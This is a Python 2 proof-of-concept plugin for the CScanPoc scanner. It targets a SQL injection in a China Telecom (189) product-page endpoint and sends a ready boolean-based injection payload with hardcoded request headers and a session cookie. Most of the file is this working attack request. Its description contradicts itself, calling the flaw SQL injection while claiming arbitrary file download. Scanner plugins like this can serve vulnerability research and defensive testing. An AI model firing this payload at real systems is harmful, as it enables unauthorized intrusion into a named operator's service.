# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '189_0103' # 平台漏洞编号
    name = '中国电信存在SQL注射' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-03-05'  # 漏洞公布时间
    desc = '''
    中国电信存在SQL注射漏洞，攻击者可以通过任意文件下载来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=170889
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '189(电信)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f96f1fa5-549c-4cb7-8614-a144cf6a0340' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/extpmsPdtInfo.do?action=salePdtPageView&BRAND=&CHIP=-1%20OR%203*2*1%3d6%20AND%20000921%3d000921&CONSUME_GROUP=0&INTEGRAL_GEN=&IS_GIFT=&MSG_CARD=&NET_TYPE=&OS=0&page_index=1&searchType=&SKSD=0&value(CONTRACT_PRICE)=&value(keyword)=1&value(orderByStr)=&value(PDT_TYPE)=&value(SALE_PRICE)=&value(SCREEN_SIZE)=&value(select_value)=%25E4%25BA%25A7%25E5%2593%2581&value(withPeomote)=&_=1452656431296"
            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': '{}/zgLoginAction.do'.format(self.target),
                'Cookie': 'JSESSIONID=A5C98CCF4A7C81CC4A3438C86412A367; rayvwulm=1',
                'Host':self.target,
                'Connection': 'Keep-alive',
                'Accept-Encoding': 'gzip,deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
                'Accept': '*/*'
            }
            url = self.target + payload
            response = requests.get(url, headers=headers)
            if "total" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
